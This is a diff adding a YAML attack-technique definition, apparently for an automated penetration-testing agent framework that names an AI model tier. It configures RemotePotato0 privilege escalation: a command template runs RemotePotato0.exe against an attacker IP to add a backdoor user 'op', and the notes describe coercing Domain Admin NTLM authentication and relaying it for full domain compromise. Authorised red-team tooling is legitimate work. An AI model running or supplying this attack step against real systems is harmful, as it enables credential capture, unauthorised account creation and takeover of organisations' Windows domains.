@@ -1,0 +1,28 @@
+name: remotepotato0
+category: privesc
+description: RemotePotato0 — cross-session NTLM relay via RPC DCOM for Interactive User
+preconditions:
+- shell_obtained
+- another_user_logged_in
+- service.port==135
+parameters:
+  attacker_ip: from_engagement.attacker_ip
+  target_ip: from_engagement.target_ip
+command_template: RemotePotato0.exe -r {attacker_ip} -e "cmd.exe /c net user op P@ssw0rd /add"
+parser: generic_parser
+expected_effects:
+- cross_session_token_obtained
+- netntlmv2_hash_captured
+- has_hash
+falsifier:
+  pattern: no session|COM initialization|patched|RPC failed
+  timeout: 90
+model_tier: sonnet
+mechanism: |
+  CVE-2020-1113 family. RPC DCOM cross-session activation causes the other logged-on
+  user's context to authenticate outbound. Trigger from a low-priv session, coerce
+  Domain Admin auth (if DA is logged in interactively) → relay to LDAP/SMB for full
+  compromise. Most effective on Citrix / Terminal Server / jump hosts.
+references:
+  ocd_mindmap: 'Branch 11: RemotePotato0 (cross-session coercion)'
+  hacktricks: windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
